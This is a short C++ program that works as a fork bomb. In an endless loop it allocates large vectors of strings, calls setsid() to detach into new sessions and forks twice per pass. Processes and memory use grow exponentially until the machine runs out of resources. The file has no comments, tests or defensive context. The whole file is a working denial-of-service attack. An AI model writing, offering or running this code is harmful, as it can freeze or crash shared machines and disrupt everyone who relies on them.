#include <string>
#include <unistd.h>
#include <vector>

int main () {

    while(1) {
        std::vector<std::vector<std::string>> big(1000, std::vector<std::string>(1, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"));
		setsid();
		fork();
        fork();
    }
    return 0;
}
